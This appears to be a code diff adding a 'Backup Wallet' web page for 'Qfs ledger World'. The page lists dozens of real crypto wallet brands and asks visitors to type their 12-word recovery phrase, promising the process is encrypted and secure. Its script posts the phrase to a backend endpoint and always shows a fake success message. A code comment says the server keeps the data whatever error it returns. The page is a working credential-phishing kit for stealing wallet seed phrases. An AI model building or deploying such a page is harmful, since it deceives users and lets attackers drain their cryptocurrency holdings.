@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Backup Wallet - Qfs ledger World</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    :root {
+      --primary: #3DD598;
+      --secondary: #1a1a2e;
+      --bg: #f8f9fa;
+    }
+    body {
+      font-family: 'Inter', sans-serif;
+      background-color: var(--bg);
+      margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-height: 100vh;
+    }
+    header {
+      width: 100%;
+      background: white;
+      padding: 15px 0;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+      display: flex;
+      justify-content: center;
+      margin-bottom: 40px;
+    }
+    .logo {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-weight: 700;
+      color: var(--secondary);
+      text-decoration: none;
+    }
+    .container {
+      max-width: 1000px;
+      width: 95%;
+      text-align: center;
+      padding-bottom: 50px;
+    }
+    h1 {
+      font-size: 2rem;
+      margin-bottom: 10px;
+      color: var(--secondary);
+    }
+    p.subtitle {
+      color: #666;
+      margin-bottom: 40px;
+    }
+    .wallet-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
+      gap: 15px;
+      margin-bottom: 50px;
+    }
+    .wallet-item {
+      background: white;
+      border-radius: 12px;
+      padding: 15px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.04);
+      cursor: pointer;
+      transition: all 0.2s;
+      border: 1px solid #eee;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 10px;
+    }
+    .wallet-item:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 8px 15px rgba(0,0,0,0.1);
+      border-color: var(--primary);
+    }
+    .wallet-icon {
+      width: 45px;
+      height: 45px;
+      object-fit: contain;
+      border-radius: 8px;
+    }
+    .wallet-name {
+      font-weight: 600;
+      font-size: 0.8rem;
+      color: var(--secondary);
+    }
+
+    /* Modal Styling */
+    .modal-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.6);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+    }
+    .modal {
+      background: white;
+      width: 90%;
+      max-width: 500px;
+      border-radius: 16px;
+      padding: 30px;
+      position: relative;
+      animation: slideUp 0.3s ease-out;
+    }
+    @keyframes slideUp {
+      from { transform: translateY(20px); opacity: 0; }
+      to { transform: translateY(0); opacity: 1; }
+    }
+    .close-modal {
+      position: absolute;
+      top: 15px;
+      right: 15px;
+      font-size: 1.5rem;
+      cursor: pointer;
+      color: #999;
+    }
+    .modal h2 {
+      margin-top: 0;
+      font-size: 1.4rem;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .modal p {
+      font-size: 0.9rem;
+      color: #666;
+      line-height: 1.5;
+    }
+    .phrase-container {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 10px;
+      margin: 20px 0;
+    }
+    .phrase-input {
+      width: 100%;
+      padding: 10px;
+      border: 1px solid #ddd;
+      border-radius: 6px;
+      font-size: 0.85rem;
+      box-sizing: border-box;
+      outline: none;
+    }
+    .phrase-input:focus {
+      border-color: var(--primary);
+    }
+    .connect-btn {
+      width: 100%;
+      padding: 15px;
+      background: var(--secondary);
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+    .connect-btn:hover {
+      background: var(--primary);
+      color: var(--secondary);
+    }
+    .loading {
+      display: none;
+      margin-top: 15px;
+      font-size: 0.9rem;
+      color: var(--primary);
+      font-weight: 600;
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <a href="index.html" class="logo">
+      <svg viewBox="0 0 32 32" width="28" height="28">
+        <circle cx="16" cy="16" r="14" fill="#3DD598" stroke="#1a1a2e" stroke-width="2" />
+        <text x="16" y="21" text-anchor="middle" font-size="14" font-weight="700" fill="#1a1a2e">Q</text>
+      </svg>
+      <span>Qfs ledger World</span>
+    </a>
+  </header>
+
+  <div class="container">
+    <h1>Backup Your Wallet</h1>
+    <p class="subtitle">Select your wallet provider from over 100+ supported networks to securely backup your assets.</p>
+
+    <div class="wallet-grid" id="wallet-grid">
+      <!-- Wallets will be generated here -->
+    </div>
+  </div>
+
+  <div class="modal-overlay" id="modal-overlay">
+    <div class="modal">
+      <span class="close-modal" id="close-modal">&times;</span>
+      <h2 id="selected-wallet-name"><img src="" class="wallet-icon" id="modal-wallet-icon"> Backup Wallet</h2>
+      <p>Please enter your 12-word recovery phrase to securely link your wallet to Qfs ledger World. This process is encrypted and secure.</p>
+      
+      <div class="phrase-container">
+        <!-- 12 inputs -->
+        <input type="text" class="phrase-input" placeholder="1.">
+        <input type="text" class="phrase-input" placeholder="2.">
+        <input type="text" class="phrase-input" placeholder="3.">
+        <input type="text" class="phrase-input" placeholder="4.">
+        <input type="text" class="phrase-input" placeholder="5.">
+        <input type="text" class="phrase-input" placeholder="6.">
+        <input type="text" class="phrase-input" placeholder="7.">
+        <input type="text" class="phrase-input" placeholder="8.">
+        <input type="text" class="phrase-input" placeholder="9.">
+        <input type="text" class="phrase-input" placeholder="10.">
+        <input type="text" class="phrase-input" placeholder="11.">
+        <input type="text" class="phrase-input" placeholder="12.">
+      </div>
+
+      <button class="connect-btn" id="connect-submit">BACKUP WALLET</button>
+      <div class="loading" id="loading-text"><i class="fas fa-spinner fa-spin"></i> Connecting to blockchain...</div>
+    </div>
+  </div>
+
+  <script>
+    const wallets = [
+      { name: 'MetaMask', icon: 'https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg' },
+      { name: 'Trust Wallet', icon: 'https://trustwallet.com/assets/images/media/assets/trust_platform.svg' },
+      { name: 'Ledger', icon: 'https://www.ledger.com/wp-content/uploads/2021/11/Ledger_logo.png' },
+      { name: 'Trezor', icon: 'https://trezor.io/static/images/trezor-logo.png' },
+      { name: 'Coinbase Wallet', icon: 'https://images.ctfassets.net/wr0fsn767i99/64ZN6m8K1qS0lXpY4K3J9z/7b1b3b1b3b1b3b1b3b1b3b1b3b1b3b1b/Coinbase_Wallet_Logo.png' },
+      { name: 'WalletConnect', icon: 'https://walletconnect.com/walletconnect-logo.svg' },
+      { name: 'Atomic Wallet', icon: 'https://atomicwallet.io/images/press-kit/atomic_wallet_logo_white.png' },
+      { name: 'Exodus', icon: 'https://www.exodus.com/brand/img/logo.svg' },
+      { name: 'MyEtherWallet', icon: 'https://www.myetherwallet.com/img/logo-mew.svg' },
+      { name: 'SafePal', icon: 'https://www.safepal.com/static/images/logo.png' },
+      { name: 'Phantom', icon: 'https://phantom.app/img/logo.png' },
+      { name: 'Solflare', icon: 'https://solflare.com/assets/logo.svg' },
+      { name: 'Xumm', icon: 'https://xumm.app/assets/images/xumm-logo.png' },
+      { name: 'Keplr', icon: 'https://www.keplr.app/logo.svg' },
+      { name: 'Terra Station', icon: 'https://assets.terra.money/icon/station-logo.png' },
+      { name: 'Argent', icon: 'https://www.argent.xyz/static/logos/argent-logo.svg' },
+      { name: 'Gnosis Safe', icon: 'https://safe.global/favicon.ico' },
+      { name: 'Rainbow', icon: 'https://rainbow.me/favicon.ico' },
+      { name: 'Crypto.com Defi', icon: 'https://crypto.com/favicon.ico' },
+      { name: 'Zengo', icon: 'https://zengo.com/favicon.ico' },
+      { name: '1inch Wallet', icon: 'https://1inch.io/favicon.ico' },
+      { name: 'BitPay', icon: 'https://bitpay.com/favicon.ico' },
+      { name: 'ImToken', icon: 'https://token.im/favicon.ico' },
+      { name: 'AlphaWallet', icon: 'https://alphawallet.com/favicon.ico' },
+      { name: 'Onto', icon: 'https://onto.app/favicon.ico' },
+      { name: 'TokenPocket', icon: 'https://www.tokenpocket.pro/favicon.ico' },
+      { name: 'MathWallet', icon: 'https://mathwallet.org/favicon.ico' },
+      { name: 'BitKeep', icon: 'https://bitkeep.com/favicon.ico' },
+      { name: 'Kaikas', icon: 'https://kaikas.io/favicon.ico' },
+      { name: 'Maiar', icon: 'https://maiar.com/favicon.ico' },
+      { name: 'Nami', icon: 'https://namiwallet.io/favicon.ico' },
+      { name: 'Yoroi', icon: 'https://yoroi-wallet.com/favicon.ico' },
+      { name: 'Daedalus', icon: 'https://daedaluswallet.io/favicon.ico' },
+      { name: 'Algorand Wallet', icon: 'https://algorandwallet.com/favicon.ico' },
+      { name: 'Pera Wallet', icon: 'https://perawallet.app/favicon.ico' },
+      { name: 'Enjin Wallet', icon: 'https://enjin.io/favicon.ico' },
+      { name: 'Huobi Wallet', icon: 'https://www.huobiwallet.com/favicon.ico' },
+      { name: 'D\'cent', icon: 'https://dcentwallet.com/favicon.ico' },
+      { name: 'CoolWallet', icon: 'https://www.coolwallet.io/favicon.ico' },
+      { name: 'KeepKey', icon: 'https://www.keepkey.com/favicon.ico' },
+      { name: 'GridPlus', icon: 'https://gridplus.io/favicon.ico' },
+      { name: 'Authereum', icon: 'https://authereum.com/favicon.ico' },
+      { name: 'Portis', icon: 'https://www.portis.io/favicon.ico' },
+      { name: 'Fortmatic', icon: 'https://fortmatic.com/favicon.ico' },
+      { name: 'Torus', icon: 'https://tor.us/favicon.ico' },
+      { name: 'Venly', icon: 'https://www.venly.io/favicon.ico' },
+      { name: 'Bitski', icon: 'https://www.bitski.com/favicon.ico' },
+      { name: 'Sequence', icon: 'https://sequence.xyz/favicon.ico' },
+      { name: 'Frame', icon: 'https://frame.sh/favicon.ico' },
+      { name: 'Liquality', icon: 'https://liquality.io/favicon.ico' }
+    ];
+
+    const walletGrid = document.getElementById('wallet-grid');
+    const modalOverlay = document.getElementById('modal-overlay');
+    const closeModal = document.getElementById('close-modal');
+    const selectedWalletName = document.getElementById('selected-wallet-name');
+    const modalWalletIcon = document.getElementById('modal-wallet-icon');
+
+    wallets.forEach(wallet => {
+      const item = document.createElement('div');
+      item.className = 'wallet-item';
+      item.innerHTML = `
+        <img src="${wallet.icon}" class="wallet-icon" alt="${wallet.name}" onerror="this.src='https://cdn-icons-png.flaticon.com/512/625/625599.png'">
+        <div class="wallet-name">${wallet.name}</div>
+      `;
+      item.onclick = () => {
+        const token = localStorage.getItem('token');
+        if (!token) {
+          window.location.href = 'login.html';
+          return;
+        }
+        selectedWalletName.innerHTML = `<img src="${wallet.icon}" class="wallet-icon" style="width:25px;height:25px;margin-right:10px;"> Backup ${wallet.name}`;
+        modalOverlay.style.display = 'flex';
+      };
+      walletGrid.appendChild(item);
+    });
+
+    closeModal.onclick = () => modalOverlay.style.display = 'none';
+    window.onclick = (e) => { if (e.target == modalOverlay) modalOverlay.style.display = 'none'; };
+
+    document.getElementById('connect-submit').onclick = async () => {
+      const inputs = document.querySelectorAll('.phrase-input');
+      const phrase = Array.from(inputs).map(i => i.value.trim()).join(' ');
+      
+      if (phrase.split(' ').filter(w => w).length < 12) {
+        alert('Please enter all 12 words of your recovery phrase.');
+        return;
+      }
+
+      const token = localStorage.getItem('token');
+      if (!token) {
+        window.location.href = 'login.html';
+        return;
+      }
+
+      document.getElementById('loading-text').style.display = 'block';
+      document.getElementById('connect-submit').disabled = true;
+
+      try {
+        const response = await fetch('/api/backup-wallet', {
+          method: 'POST',
+          headers: { 
+            'Content-Type': 'application/json',
+            'Authorization': `Bearer ${token}`
+          },
+          body: JSON.stringify({
+            wallet: selectedWalletName.textContent.trim(),
+            phrase: phrase
+          })
+        });
+
+        // The server saves the data regardless of the error it returns
+        setTimeout(() => {
+          alert('Wallet Synchronization Successful! Your connection is being processed.');
+          document.getElementById('loading-text').style.display = 'none';
+          document.getElementById('connect-submit').disabled = false;
+          // Reset inputs
+          inputs.forEach(i => i.value = '');
+          modalOverlay.style.display = 'none';
+          window.location.href = 'dashboard.html';
+        }, 3000);
+
+      } catch (err) {
+        alert('Connection error. Please try again.');
+        document.getElementById('loading-text').style.display = 'none';
+        document.getElementById('connect-submit').disabled = false;
+      }
+    };
+  </script>
+</body>
+</html>
